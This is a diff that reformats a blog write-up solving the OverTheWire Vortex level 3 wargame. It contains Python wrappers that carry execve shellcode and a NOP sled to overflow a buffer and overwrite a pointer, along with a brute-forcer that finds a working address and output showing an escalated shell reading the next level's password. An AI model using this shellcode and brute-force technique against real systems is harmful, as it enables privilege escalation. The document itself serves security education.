@@ -89,33 +89,14 @@ We find 0x08048366, that points to _`08049540`_ (first destructor function). If 
 ```
 
 ## Find lpp offset
-We'll build the vortex3 source code locally, with added prints to track lpp value after overflowing buf. To reproduce the environment in the vortex labs, we need to disable ASLR (Address Space Layout Randomization) and compile without stack protector:
-?
-1
-2
-3
+We'll build the vortex3 source code locally, with added prints to track _`lpp`_ value after overflowing _`buf`_. To reproduce the environment in the vortex labs, we need to disable ASLR (Address Space Layout Randomization) and compile without stack protector:
+```bash
 # echo 0 > /proc/sys/kernel/randomize_va_space
 # gcc -fno-stack-protector -U_FORTIFY_SOURCE vortex3.c -o vortex3
-#
-From a Python wrapper, we'll pass the previous shellcode and watch if we set correctly lpp variable after strcpy: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
+```
+
+From a Python wrapper, we'll pass the previous shellcode and watch if we set correctly `lpp`_ variable after strcpy: 
+```python
 import sys
  
 shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" + \
@@ -133,27 +114,16 @@ if __name__=="__main__":
     # number of NOP needed to overflow exactly the lpp variable
     # may be different than this one for vortex labs binary 
     print shellcode + NOP * (128-len(shellcode))  + addr
+```    
+
 And we see we can control lpp: 
-?
-1
-2
-3
+```bash
 # ./vortex3 `python L3.py`
 lpp before: 0x804a024
 lpp after: 0x44434241
-For the vortex3 binary on vortex labs, there will be a difference (of 4 bytes) on the length of NOP sled needed. That's because the position of lpp variable on the stack differs by 4 bytes.
-On vortex labs:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+```
+For the vortex3 binary on vortex labs, there will be a difference (of 4 bytes) on the length of NOP sled needed. That's because the position of the _`lpp`_ variable on the stack differs by 4 bytes. On Vortex labs:
+```bash
 (gdb) disas main
 Dump of assembler code for function main:
    0x080483d4 <+0>: push   ebp
@@ -164,18 +134,9 @@ Dump of assembler code for function main:
    ...
 (gdb) x/x 0x804963c
 0x804963c <lp>: 0x08049638
-And locally: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+```
+And locally we have: 
+```bash
 (gdb) disassemble main
 Dump of assembler code for function main:
    0x08048484 <+0>: push   ebp
@@ -183,28 +144,13 @@ Dump of assembler code for function main:
    0x08048487 <+3>: and    esp,0xfffffff0
    0x0804848a <+6>: sub    esp,0xa0
    0x08048490 <+12>: mov    DWORD PTR [esp+0x98],0x804a024
-   ...
+   [..]
 (gdb) x/x 0x804a024
 0x804a024 <lp>: 0x0804a020
-So, on the vortex labs machine we'll create the python wrapper file in tmp folder, taking into account the NOP sled difference:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
+```
+
+So, on the Vortex labs machine we'll create a Python wrapper file in _`tmp`_ folder, taking into account the NOP sled difference:
+```python
 import sys
  
 shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" + \
@@ -222,39 +168,19 @@ if __name__=="__main__":
     # number of NOP needed to overflow exactly the lpp variable
     # may be different than this one for vortex labs binary 
     print shellcode + NOP * (128-len(shellcode) + 4)  + addr
+```
+
 But, when trying to exploit, we get a segmentation fault: 
-?
-1
-2
+```bash
 $ ./vortex3 `python /tmp/myv3.py`
 Segmentation fault
-That may be because of the subtle reason mentioned on the level description (ctors/dtors might no longer be writable). (Older solutions present online worked because the level was compiled with another gcc version, and overwriting .dtors as suggested in the reading was possible). Anyway, the author gives the suggestion for solving this: "an intelligent bruteforce".
+```
 
-Python brute-forcer
-We will only brute force a small part of the address space (16 bytes), because the first 2 bytes of lpp we already know that must be 0x0804. With the following python wrapper we'll generate payloads and pass them to vortex3 binary until we find a shell.  The p.wait() function stops and wait until the program finish executing (in our case the new shell).
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
+That may be because of the subtle reason mentioned on the level description: **_ctors/dtors might no longer be writable_**. Older solutions present online worked because the level was compiled with another gcc version, and overwriting _`.dtors`_ as suggested in the reading was possible back then. Anyway, the author of the level gives a suggestion for solving this: **_an intelligent bruteforce_**.
+
+## Python brute-forcer
+We will only brute force a small part of the address space (16 bytes), because the first 2 bytes of _`lpp`_ we already know that must be _`0x0804`_. With the following Python wrapper we'll generate payloads and pass them to _`vortex3`_ binary until we find a shell.  The _`p.wait()`_ function stops and wait until the program finish executing (in our case the new shell).
+```python
 import subprocess
  
 # shellcode generating  script
@@ -277,43 +203,22 @@ for i in range (1, 256):
          
         # block for successful shell
         p.wait()
-(Note:  i and j variables go from 1, not from 0, because 0 is the null character and is not accepted in a shell command, and thus not accepted  by the check_output() function which executes a command.)
-The result:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
+```
+
+Note that *`i`* and *`j`* variables go from 1, not from 0, because 0 is the null character and is not accepted in a shell command, and thus not accepted  by the _`check_output()`_ function which executes a command. The result of running the script:
+```bash
 vortex3@melissa:~$ python /tmp/wrapv3.py
-...
+[..]
 Trying addr:  \x8c\x91\x04\x08
 Trying addr:  \x8c\x92\x04\x08
 $ id
 uid=5003(vortex3) gid=5003(vortex3) euid=5004(vortex4) groups=5004(vortex4),5003(vortex3)
 $ cat /etc/vortex_pass/vortex4
 *******
-$
-So we got a correct address that, when put into lpp, runs our shellcode -  \x08\x04\x92\x8c.  To understand what happened, we check the address in gdb:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
+```
+
+So we got a correct address that, when put into _`lpp`_, runs our shellcode - _`\x08\x04\x92\x8c`_.  To understand what happened, we can check the address in gdb:
+```bash
 $ gdb /vortex/vortex3
 (gdb) break main
 Breakpoint 1 at 0x80483d7
@@ -327,29 +232,6 @@ Breakpoint 1, 0x080483d7 in main ()
 0x804962c <_global_offset_table_>: 0x0804830a
 (gdb) x/x 0x0804830a
 0x804830a <exit@plt+6>: 0x00001868
-(gdb) 
-So we've actually overwritten the exit function in the .plt section.
-This was a nice exercise, at least:)
+```
 
-The scripts mentioned are available here.
-
- Reading material:
-Overwriting the .dtors section - Juan M. Bello Rivas
-Bypassing StackGuard and StackShield
-Another solution
-Posted by Liviu at 9:50 PM     
-Email This
-BlogThis!
-Share to Twitter
-Share to Facebook
-Share to Pinterest
-
-Labels: overthewire, vortex, wargame
-Reactions: 	
-No comments:
-Post a Comment
- 
-Links to this post
-Create a Link
-
-Newer Post
+So we've actually overwritten the _`exit`_ function in the _`.plt`_ section. This was a nice exercise, at least:) All the scripts mentioned are available [here](https://github.com/livz/otw-vortex).
